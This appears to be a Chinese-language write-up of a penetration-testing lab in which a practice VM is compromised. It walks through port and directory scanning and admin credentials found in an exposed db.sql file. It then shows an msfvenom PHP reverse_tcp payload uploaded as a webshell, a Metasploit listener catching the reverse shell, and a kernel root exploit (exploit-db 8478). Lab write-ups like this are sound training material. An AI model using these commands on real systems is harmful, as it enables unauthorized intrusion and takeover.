
# 0x00环境
攻击机IP：192.168.1.28<br />目标机IP：192.168.1.24


# 0x01实战

## 端口扫描
```
nmap -sV -p- 192.168.1.24
```
![](https://img-blog.csdnimg.cn/dbff3ed44b264529be71073e8bcd3e1f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=uS5Q9&originHeight=545&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到开放了很多端口


## 目录扫描
扫描出一堆东西<br />![](https://img-blog.csdnimg.cn/d66c2d1b1fef46abb1706cabde75a296.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=bKMer&originHeight=563&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 漏洞发现
根据扫描出来的目录查找发现<br />直接可以看到phpinfo<br />![](https://img-blog.csdnimg.cn/fca72255d3734af0a973f3e10e8a4cc7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zaMM7&originHeight=491&originWidth=1041&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以访问db.sql文件，直接得到数据库账户和密码<br />![](https://img-blog.csdnimg.cn/52236421eba640deaac0e1c6610da459.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=c2243&originHeight=306&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

等还有其它的一些东西就不列举了。。。


## 漏洞利用
访问80端口HTTP服务可以知道`本网站由Toby Victor开发。它由PHP和MySQL提供支持，并托管在CentOSlinux 服务器上。`<br />![](https://img-blog.csdnimg.cn/6d90072838474c1faa7bb14efb5e3fc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_12,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=EGel9&originHeight=258&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

尝试使用上面得到的账户admin/adminpass登录网站<br />![](https://img-blog.csdnimg.cn/648154c95b3a49eab4221584c3f3ca56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=heDQQ&originHeight=411&originWidth=915&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

成功登录，登录后我们可以发现我们可以编辑页面并上传图片<br />![](https://img-blog.csdnimg.cn/7910b55a0e35497baa848a3e58951e55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=qL1wg&originHeight=812&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

而且前面我们在网站主页得知是支持PHP的，那么我们可以尝试上传木马文件反弹shell

创建PHP木马文件尝试通过文件上传来上传
```
msfvenom -p php/meterpreter/reverse_tcp -o /root/shell.php  lhost=192.168.1.28 lport=4444
```

![](https://img-blog.csdnimg.cn/f0326518af994d1494da6e7a4b2e7d8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=IHDBc&originHeight=303&originWidth=1498&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

尝试上传，如果失败再尝试绕过<br />![](https://img-blog.csdnimg.cn/c7fce59fe74741aea2c03d4151d5da13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ihn0l&originHeight=621&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在主页可以看到上传成功<br />![](https://img-blog.csdnimg.cn/72f2e19be0e54f5ea000d40b2d592926.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Q0ZxG&originHeight=312&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

创建监听
```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.28
set lport 4444
run
```

![](https://img-blog.csdnimg.cn/e4f1ed4235dd49f9b943c6ae514a2ec0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Q0m7t&originHeight=343&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在主页上点击Read more即可反弹shell<br />![](https://img-blog.csdnimg.cn/a9fb4db93a694b53b4012b1ebcb66bc4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=gcGBi&originHeight=289&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/d3b3a01baaa44a179e66d7121b6c3d0c.png#crop=0&crop=0&crop=1&crop=1&id=jO9Oy&originHeight=194&originWidth=1327&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 提权
查看系统信息
```
sysinfo
```

不知为何无法执行命令<br />![](https://img-blog.csdnimg.cn/6ad3d620c154467895ca239d0a605aa1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=e2tog&originHeight=243&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用老版kali（192.168.1.12）<br />![](https://img-blog.csdnimg.cn/484f14d5142d4c8084f8207cc5696011.png#crop=0&crop=0&crop=1&crop=1&id=oK07b&originHeight=154&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

内核版本为2.6.18-92.el5，在互联网查漏洞利用https://www.exploit-db.com/exploits/8478<br />![](https://img-blog.csdnimg.cn/784b698192ac4b47a5e493d4f112db9f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=k9FX8&originHeight=441&originWidth=1379&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将提权脚本下载并查看<br />![](https://img-blog.csdnimg.cn/0f4ef42176434dee9253035a86639b97.png#crop=0&crop=0&crop=1&crop=1&id=l4fHH&originHeight=163&originWidth=556&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将dos格式修改为linux格式
```
dos2unix 8478.sh
```
![](https://img-blog.csdnimg.cn/30b1ab685475457bab9936b4061311b9.png#crop=0&crop=0&crop=1&crop=1&id=JdRiX&originHeight=160&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

上传到靶机上的tmp目录中<br />![](https://img-blog.csdnimg.cn/ec0943b5ef9a48c78b03a1ad61ad3943.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=JcS9c&originHeight=252&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

赋予脚本执行权限并执行
```
chmod +x 8478.sh
```
![](https://img-blog.csdnimg.cn/2d567457721a4686b2d076133c449cca.png#crop=0&crop=0&crop=1&crop=1&id=DR8Ji&originHeight=188&originWidth=1114&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

报错，因为必须为脚本提供正确的 PID 才能使代码正常工作。所以现在我们必须找到一个合适的 PID，并在该 PID 的帮助下运行脚本
```
cat /proc/net/netlink
```
![](https://img-blog.csdnimg.cn/ac31bbf769884b19bc8f73d444a301e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=XTgO2&originHeight=435&originWidth=953&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

执行脚本，多尝试几次，成功得到root权限
```
./8478.sh 568
```
![](https://img-blog.csdnimg.cn/f346b6d2259343409c7e3da9611d3a22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=NSkVQ&originHeight=490&originWidth=1129&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

